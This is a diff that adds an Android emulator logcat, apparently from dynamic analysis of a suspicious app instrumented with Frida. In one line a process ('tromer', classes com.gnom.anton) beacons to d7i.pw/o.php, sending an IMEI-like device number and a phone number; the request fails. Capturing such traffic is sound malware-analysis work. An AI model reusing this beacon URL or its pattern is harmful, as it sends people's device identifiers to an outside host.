@@ -1,0 +1,1533 @@
+--------- beginning of system
+12-05 18:45:42.328  1641  1660 E UsbDeviceManager: waitForState(none) FAILED: got 
+12-05 18:45:42.328  1641  1660 E UsbDeviceManager: Failed to kick USB config
+12-05 18:45:42.328  1641  1660 E UsbDeviceManager: Failsafe 2: Restoring default USB functions.
+12-05 18:45:42.328  1641  1660 I UsbDeviceManager: Setting USB config to adb
+--------- beginning of main
+12-05 18:53:53.245  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.herrevad.services.LightweightNetworkQualityAndroidService.START pkg=com.google.android.gms }
+12-05 18:53:53.868  4537  4542 I zygote  : Do partial code cache collection, code=121KB, data=91KB
+12-05 18:53:53.869  4537  4542 I zygote  : After code cache collection, code=121KB, data=91KB
+12-05 18:53:53.869  4537  4542 I zygote  : Increasing code cache capacity to 512KB
+12-05 18:53:55.024  5398  6090 I Dialer  : VvmTaskExecutor - executing task com.android.voicemail.impl.ActivationTask@27ca889
+12-05 18:53:55.024  5398  6090 I Dialer  : PreOMigrationHandler - ComponentInfo{com.android.phone/com.android.services.telephony.TelephonyConnectionService}, [****], UserHandle{0} already migrated
+12-05 18:53:55.038  5398  6090 I Dialer  : VvmActivationTask - VVM content provider configured - vvm_type_cvvm
+12-05 18:53:55.039  5398  6090 I Dialer  : OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_ACTIVATING
+12-05 18:53:55.044  5398  6090 I Dialer  : TelephonyMangerCompat.setVisualVoicemailSmsFilterSettings - using TelephonyManager
+12-05 18:53:55.046  5398  6090 I Dialer  : TelephonyMangerCompat.sendVisualVoicemailSms - using TelephonyManager
+12-05 18:53:59.026  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:53:59.026  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:53:59.034  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:53:59.034  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:53:59.060  1641  1667 I PackageManager.DexOptimizer: Running dexopt (dexoptNeeded=1) on: /data/app/com.anigilyator.org-vNTpWXeHaM1Qj1WGb1mbEQ==/base.apk pkg=com.anigilyator.org isa=x86 dexoptFlags=boot_complete,public target-filter=quicken oatDir=/data/app/com.anigilyator.org-vNTpWXeHaM1Qj1WGb1mbEQ==/oat sharedLibraries=PCL[]
+12-05 18:53:59.065  6625  6625 W dex2oat : Unexpected CPU variant for X86 using defaults: x86
+12-05 18:53:59.066  6625  6625 W dex2oat : Mismatch between dex2oat instruction set features (ISA: X86 Feature string: -ssse3,-sse4.1,-sse4.2,-avx,-avx2,-popcnt) and those of dex2oat executable (ISA: X86 Feature string: ssse3,-sse4.1,-sse4.2,-avx,-avx2,-popcnt) for the command line:
+12-05 18:53:59.066  6625  6625 W dex2oat : /system/bin/dex2oat --zip-fd=8 --zip-location=base.apk --input-vdex-fd=-1 --output-vdex-fd=10 --oat-fd=9 --oat-location=/data/app/com.anigilyator.org-vNTpWXeHaM1Qj1WGb1mbEQ==/oat/x86/base.odex --instruction-set=x86 --instruction-set-variant=x86 --instruction-set-features=default --runtime-arg -Xms64m --runtime-arg -Xmx512m --compiler-filter=quicken --swap-fd=11 --classpath-dir=/data/app/com.anigilyator.org-vNTpWXeHaM1Qj1WGb1mbEQ== --class-loader-context=PCL[]
+12-05 18:53:59.066  6625  6625 I dex2oat : /system/bin/dex2oat --input-vdex-fd=-1 --output-vdex-fd=10 --compiler-filter=quicken --classpath-dir=/data/app/com.anigilyator.org-vNTpWXeHaM1Qj1WGb1mbEQ== --class-loader-context=PCL[]
+12-05 18:53:59.066  6625  6625 W dex2oat : Could not reserve sentinel fault page
+12-05 18:53:59.097  6625  6625 I dex2oat : dex2oat took 31.768ms (21.848ms cpu) (threads: 4) arena alloc=6KB (6424B) java alloc=35KB (35992B) native alloc=1221KB (1251024B) free=1338KB (1370416B)
+12-05 18:53:59.134  1518  1693 D installd: Applied hard quotas for 10626
+12-05 18:53:59.135  1518  1693 E         : Couldn't opendir /data/app/vmdl1951724796.tmp: No such file or directory
+12-05 18:53:59.135  1518  1693 E installd: Failed to delete /data/app/vmdl1951724796.tmp: No such file or directory
+12-05 18:53:59.137  2151  2151 I GsaVoiceInteractionSrv: O received Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) }
+12-05 18:53:59.139  3743  3743 I Finsky  : [2] ynx.d(13): PackageMonitorReceiverImpl - Received: android.intent.action.PACKAGE_ADDED, [wHCa57U5naAyw4p6nGmL1DYmPSrA65_wcZn_cBLPbNA]
+12-05 18:53:59.139  3743  3743 I Finsky  : [2] yoy.g(1): Invalidating cached PackageState for com.anigilyator.org
+12-05 18:53:59.139  1641  1767 W BroadcastQueue: Background execution not allowed: receiving Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) } to com.android.vending/com.google.android.finsky.packagemanager.impl.PackageMonitorReceiverImpl$RegisteredReceiver
+12-05 18:53:59.143  1641  1655 W BroadcastQueue: Background execution not allowed: receiving Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) } to com.google.android.gms/.games.chimera.GamesSystemBroadcastReceiverProxy
+12-05 18:53:59.143  1641  1655 W BroadcastQueue: Background execution not allowed: receiving Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) } to com.google.android.gms/.gass.chimera.PackageChangeBroadcastReceiver
+12-05 18:53:59.143  1641  1655 W BroadcastQueue: Background execution not allowed: receiving Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) } to com.google.android.gms/.chimera.GmsIntentOperationService$PersistentTrustedReceiver
+12-05 18:53:59.143  1641  1655 W BroadcastQueue: Background execution not allowed: receiving Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 (has extras) } to com.google.android.googlequicksearchbox/com.google.android.apps.gsa.googlequicksearchbox.GelStubAppWatcher
+12-05 18:53:59.144  1641  1703 I InputReader: Reconfiguring input devices.  changes=0x00000010
+12-05 18:53:59.145  1641  1641 I Telecom : DefaultDialerCache: Refreshing default dialer for user 0: now com.google.android.dialer: DDC.oR@AH8
+12-05 18:53:59.150  3743  3743 I Finsky  : [2] oxf.d(2): Frosting ID looked up on UI thread. Caller should move to a background thread.
+12-05 18:53:59.152  3743  3743 I Finsky  : [2] anan.a(3): Do not start WearSupportService due to Wear service optimization
+12-05 18:53:59.153  3743  3743 I Finsky  : [2] anan.a(3): Do not start WearSupportService due to Wear service optimization
+12-05 18:53:59.153  3743  6474 I Finsky  : [325] jog.a(15): [ContentSync] finished, scheduled=false
+12-05 18:53:59.153  3743  3743 I Finsky  : [2] aeke.a(8): Clearing split related stale data.
+12-05 18:53:59.154  3743  6570 I Finsky  : [329] gxa.a(12): Asset module storage cleared for package com.anigilyator.org.
+12-05 18:53:59.156  6143  6630 I ProvidersCache: Provider returned no roots. Possibly naughty: com.google.android.apps.docs.storage
+12-05 18:53:59.161  1641  2852 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 2000
+12-05 18:53:59.162  3743  3743 I Finsky  : [2] oxf.d(2): Frosting ID looked up on UI thread. Caller should move to a background thread.
+12-05 18:53:59.163  3743  6568 I Finsky  : [328] ows.run(16): Wrote row to frosting DB: 1614
+12-05 18:53:59.167  3743  6568 I Finsky  : [328] ows.run(16): Wrote row to frosting DB: 1615
+12-05 18:53:59.169  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.170  1874  1874 D CarrierSvcBindHelper: No carrier app for: 0
+12-05 18:53:59.173  6639  6639 W zygote  : Unexpected CPU variant for X86 using defaults: x86
+12-05 18:53:59.174  1874  1874 D ImsResolver: maybeAddedImsService, packageName: com.anigilyator.org
+12-05 18:53:59.175  1874  1874 D CarrierConfigLoader: mHandler: 9 phoneId: 0
+12-05 18:53:59.180  1641  1895 I ActivityManager: Start proc 6639:com.anigilyator.org/u0a626 for activity com.anigilyator.org/.Annotatio
+12-05 18:53:59.182  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.186  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 2 lines
+12-05 18:53:59.192  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.194  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 7753728
+12-05 18:53:59.203  6639  6639 W Frida-Gadget Loading: !!!!!!!!!!!!!!!!
+12-05 18:53:59.209  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.common.BIND_SHARED_PREFS pkg=com.google.android.gms }
+12-05 18:53:59.209  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.common.BIND_SHARED_PREFS pkg=com.google.android.gms }
+12-05 18:53:59.212  2186  6660 I Auth    : [SupervisedAccountIntentOperation] onHandleIntent(): android.intent.action.PACKAGE_ADDED
+12-05 18:53:59.214  2186  6664 I ChromeSync: [Sync,SyncIntentOperation] Handling the intent: Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 pkg=com.google.android.gms cmp=com.google.android.gms/.chimera.GmsIntentOperationService (has extras) }.
+12-05 18:53:59.215  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.218  2016  6656 I FontLog : Package com.anigilyator.org has no metadata [CONTEXT service_id=132 ]
+12-05 18:53:59.218  2016  6655 W GCM     : Unexpected forwarded intent: Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 pkg=com.google.android.gms cmp=com.google.android.gms/.chimera.PersistentIntentOperationService (has extras) }
+12-05 18:53:59.219  2016  6633 W GCM     : Unexpected forwarded intent: Intent { act=android.intent.action.PACKAGE_ADDED dat=package:com.anigilyator.org flg=0x4000010 pkg=com.google.android.gms cmp=com.google.android.gms/.chimera.PersistentIntentOperationService (has extras) }
+12-05 18:53:59.229  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 8298496
+12-05 18:53:59.242  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:53:59.242  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:53:59.244  1449  1449 E EGL_emulation: tid 1449: eglCreateSyncKHR(1962): error 0x3004 (EGL_BAD_ATTRIBUTE)
+12-05 18:53:59.249  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.250  6639  6651 I zygote  : Explicit concurrent copying GC freed 1192(594KB) AllocSpace objects, 0(0B) LOS objects, 62% free, 925KB/2MB, paused 52us total 6.578ms
+12-05 18:53:59.250  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.252  1641  2852 W ActivityManager: Unable to start service Intent { act=com.google.android.gms.auth.key.retrieval.service.START pkg=com.google.android.gms } U=0: not found
+12-05 18:53:59.253  1741  1769 D         : HostConnection::get() New Host Connection established 0x8a8b3140, tid 1769
+12-05 18:53:59.255  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.257  1641  6322 W ActivityManager: Unbind failed: could not find connection for android.os.BinderProxy@517c76b
+12-05 18:53:59.257  2186  2439 E GmsClient: unable to connect to service: com.google.android.gms.auth.key.retrieval.service.START on com.google.android.gms
+12-05 18:53:59.258  2186  2549 I Icing   : IndexChimeraService.getServiceInterface callingPackage=com.google.android.gms componentName=AppsCorpus serviceId=36
+12-05 18:53:59.259  2186  2186 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.common.BIND_SHARED_PREFS pkg=com.google.android.gms }
+12-05 18:53:59.262  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.264  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 7753728
+12-05 18:53:59.270  2186  6599 E ProtoLiteUtils: Invalid message size: 795107700 (buffer end is 24984)
+12-05 18:53:59.271  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.284  1741  1962 I chatty  : uid=10028(com.android.systemui) RenderThread identical 1 line
+12-05 18:53:59.289  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.289  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.296  2186  5724 W Icing   : No valid account for uploading user actions
+12-05 18:53:59.300  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.303  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.316  2186  2516 I Icing   : IndexChimeraService.getServiceInterface callingPackage=com.google.android.gms componentName=null serviceId=30
+12-05 18:53:59.317  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.334  1741  1962 I chatty  : uid=10028(com.android.systemui) RenderThread identical 2 lines
+12-05 18:53:59.336  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.339  2186  5724 I Icing   : Usage reports ok 1, Failed Usage reports 0, indexed 0, rejected 0
+12-05 18:53:59.341  2186  5724 W Icing   : No valid account for uploading user actions
+12-05 18:53:59.344  2186  5724 I Icing   : Usage reports ok 0, Failed Usage reports 0, indexed 0, rejected 0
+12-05 18:53:59.344  2186  5724 I Icing   : Indexing com.google.android.gms-internal.3p:MobileApplication from com.google.android.gms using seqno 56
+12-05 18:53:59.346  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.350  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.352  2186  5724 I Icing   : Indexing com.google.android.gms-apps from com.google.android.gms
+12-05 18:53:59.353  2186  5724 E ProtoLiteUtils: Invalid message size: 795107700 (buffer end is 24984)
+12-05 18:53:59.354  2186  5724 I Icing   : Indexing done com.google.android.gms-apps
+12-05 18:53:59.363  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.401  1741  1962 I chatty  : uid=10028(com.android.systemui) RenderThread identical 5 lines
+12-05 18:53:59.413  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.417  6639  6678 D NetworkSecurityConfig: No Network Security Config specified, using platform default
+12-05 18:53:59.417  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.429  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 7753728
+12-05 18:53:59.430  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.436  6639  6639 D         : HostConnection::get() New Host Connection established 0x8bbf2940, tid 6639
+12-05 18:53:59.442  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.443  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.447  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.453  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.458  1641  1662 I ActivityManager: Displayed com.anigilyator.org/.Annotatio: +286ms
+12-05 18:53:59.463  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.468  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.469  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.480  1741  1962 D EGL_emulation: eglMakeCurrent: 0xa0d055a0: ver 2 0 (tinfo 0xa0d03560)
+12-05 18:53:59.635  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.682  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 2 lines
+12-05 18:53:59.849  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.858  1641  2172 E memtrack: Couldn't load memtrack module
+12-05 18:53:59.858  1641  2172 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:53:59.861  6639  6676 I zygote  : Explicit concurrent copying GC freed 6293(419KB) AllocSpace objects, 3(124KB) LOS objects, 59% free, 1044KB/2MB, paused 13us total 2.534ms
+12-05 18:53:59.952  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:53:59.971  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 2 lines
+12-05 18:54:00.288  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:00.313  1641  2821 I zygote  : android::hardware::configstore::V1_0::ISurfaceFlingerConfigs::hasWideColorDisplay retrieved: 0
+12-05 18:54:00.313  1641  2821 I OpenGLRenderer: Initialized EGL, version 1.4
+12-05 18:54:00.313  1641  2821 D OpenGLRenderer: Swap behavior 1
+12-05 18:54:00.313  1641  2821 W OpenGLRenderer: Failed to choose config with EGL_SWAP_BEHAVIOR_PRESERVED, retrying without...
+12-05 18:54:00.313  1641  2821 D OpenGLRenderer: Swap behavior 0
+12-05 18:54:00.317  1641  2821 D EGL_emulation: eglCreateContext: 0xa0a21da0: maj 2 min 0 rcv 2
+12-05 18:54:00.320  1641  2821 D EGL_emulation: eglMakeCurrent: 0xa0a21da0: ver 2 0 (tinfo 0x8d950460)
+12-05 18:54:00.401  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:54:00.401  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:00.401  6639  6674 I frida   :  !!! We are on  processor ia32
+12-05 18:54:00.404  6639  6676 I zygote  : Explicit concurrent copying GC freed 3314(130KB) AllocSpace objects, 1(20KB) LOS objects, 59% free, 1057KB/2MB, paused 15us total 3.344ms
+12-05 18:54:00.415  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:00.416  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:00.445  6639  6674 I frida   : trace() starting up to see if the deoptimisation is correctly done in other antivirus apps
+12-05 18:54:00.445  6639  6674 I frida   : printing the address of gdb::OutputMethodReturnValue 0xa830d9c0
+12-05 18:54:00.445  6639  6674 I frida   : code : 
+12-05 18:54:00.445  6639  6674 I frida   :  
+12-05 18:54:00.445  6639  6674 I frida   : ----------////////////// Archictecture  ia32
+12-05 18:54:00.449  6639  6674 I frida   : everything deoptimized
+12-05 18:54:00.449  6639  6674 I frida   : Listener correctly added
+12-05 18:54:00.613  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable void android.os.MessageQueue.nativePollOnce(long, int) at PC 0x72f0310b
+12-05 18:54:00.613  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.SystemClock.uptimeMillis() at PC 0x72f0311d
+12-05 18:54:00.613  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable android.os.Message android.os.MessageQueue.next() at PC 0x72efcd18
+12-05 18:54:00.617  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.Binder.clearCallingIdentity() at PC 0x72efd481
+12-05 18:54:00.623  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 7753728
+12-05 18:54:00.698  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.Binder.clearCallingIdentity() at PC 0x72efd481
+12-05 18:54:00.770  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.Binder.clearCallingIdentity() at PC 0x72efd481
+12-05 18:54:00.775  1439  1475 D gralloc_ranchu: gralloc_alloc: Creating ashmem region of size 7753728
+12-05 18:54:00.813  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.Binder.clearCallingIdentity() at PC 0x72efd481
+12-05 18:54:00.892  6639  6639 I chatty  : uid=10626(com.anigilyator.org) identical 2 lines
+12-05 18:54:00.936  6639  6639 W zygote  : Got a deoptimization request on un-deoptimizable long android.os.Binder.clearCallingIdentity() at PC 0x72efd481
+12-05 18:54:00.949  1641  2950 E memtrack: Couldn't load memtrack module
+12-05 18:54:00.949  1641  2950 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:54:00.967  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:54:00.968  6639  6647 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait(long, int) at PC 0x715277a5
+12-05 18:54:00.968  6639  6647 W zygote  : Got a deoptimization request on un-deoptimizable java.lang.ref.Reference java.lang.ref.ReferenceQueue.remove(long) at PC 0x71527504
+12-05 18:54:00.968  6639  6647 W zygote  : Got a deoptimization request on un-deoptimizable java.lang.ref.Reference java.lang.ref.ReferenceQueue.remove() at PC 0x71d871f8
+12-05 18:54:00.968  6639  6676 I zygote  : Explicit concurrent copying GC freed 12231(603KB) AllocSpace objects, 1(20KB) LOS objects, 58% free, 1109KB/2MB, paused 10us total 3.023ms
+12-05 18:54:01.415  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait(long, int) at PC 0x71439fce
+12-05 18:54:01.415  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Thread.parkFor$(long) at PC 0x718561d2
+12-05 18:54:01.415  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable long java.lang.System.nanoTime() at PC 0x718565e5
+12-05 18:54:01.416  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable long java.lang.System.nanoTime() at PC 0x71856c04
+12-05 18:54:01.416  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable long java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(long) at PC 0x7182fd9e
+12-05 18:54:01.419  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable java.util.concurrent.RunnableScheduledFuture java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take() at PC 0x7182fbba
+12-05 18:54:01.419  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable java.lang.Object java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take() at PC 0x71832fdd
+12-05 18:54:01.419  6639  6678 W zygote  : Got a deoptimization request on un-deoptimizable java.lang.Runnable java.util.concurrent.ThreadPoolExecutor.getTask() at PC 0x718353f8
+12-05 18:54:01.427  6099  6099 D tromer  : started
+12-05 18:54:01.427  1641  2172 I WifiService: acquireWifiLock uid=10402 lockMode=1
+12-05 18:54:01.428  6099  6700 D tromer  : state : null
+12-05 18:54:01.428  6099  6700 D tromer  : http://d7i.pw/o.php?a=1&b=358240051111110&c=Android&d=us&e=+15555215554&f=0.3.300&g=8.1.0&prefix=core_2
+12-05 18:54:01.429  3743  3743 I Finsky  : [2] aclz.onStartJob(3): SCH: onJobSchedulerWakeup with jobId 9005
+12-05 18:54:01.430  3743  3743 I Finsky  : [2] achd.a(9): SCH: Scheduling fallback job with id: 9034, and delay: 43200000 ms
+12-05 18:54:01.430  6099  6700 W System.err: java.net.UnknownHostException: Unable to resolve host "d7i.pw": No address associated with hostname
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:141)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.net.Inet6AddressImpl.lookupAllHostAddr(Inet6AddressImpl.java:90)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.net.InetAddress.getAllByName(InetAddress.java:787)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.Dns$1.lookup(Dns.java:39)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.resetNextInetSocketAddress(RouteSelector.java:175)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.nextProxy(RouteSelector.java:141)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.next(RouteSelector.java:83)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:174)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:126)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:95)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:281)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:224)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:461)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:407)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:244)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.gnom.anton.a.a(Unknown Source:254)
+12-05 18:54:01.430  6099  6700 W System.err: 	at com.gnom.anton.a.doInBackground(Unknown Source:4)
+12-05 18:54:01.430  6099  6700 W System.err: 	at android.os.AsyncTask$2.call(AsyncTask.java:333)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
+12-05 18:54:01.430  6099  6700 W System.err: 	at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:245)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:54:01.430  6099  6700 W System.err: Caused by: android.system.GaiException: android_getaddrinfo failed: EAI_NODATA (No address associated with hostname)
+12-05 18:54:01.430  6099  6700 W System.err: 	at libcore.io.Linux.android_getaddrinfo(Native Method)
+12-05 18:54:01.430  6099  6700 W System.err: 	at libcore.io.ForwardingOs.android_getaddrinfo(ForwardingOs.java:59)
+12-05 18:54:01.430  6099  6700 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:122)
+12-05 18:54:01.430  6099  6700 W System.err: 	... 22 more
+12-05 18:54:01.431  1641  1767 I WifiService: releaseWifiLock uid=10402
+12-05 18:54:01.431  3743  3743 I Finsky  : [2] achd.b(9): SCH: Scheduling fallback in 64799999 (absolute: 65305015)
+12-05 18:54:01.434  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:54:01.435  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:54:01.447  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:4 exec_start_elapsed_seconds: 505 [CONTEXT service_id=218 ]
+12-05 18:54:01.449  2016  4057 I NetRec  : [202] anai.a: Refreshing scores for 1 networks.
+12-05 18:54:01.455  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:54:01.455  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:54:01.461  2016  2499 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:54:01.461  2016  2499 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:54:01.463  2016  2406 E apzj    : Phenotype API error. Event # ceqj@6c5a5ded, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:54:01.463  2016  2406 E apzj    : apyo: 29503
+12-05 18:54:01.463  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:54:01.463  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
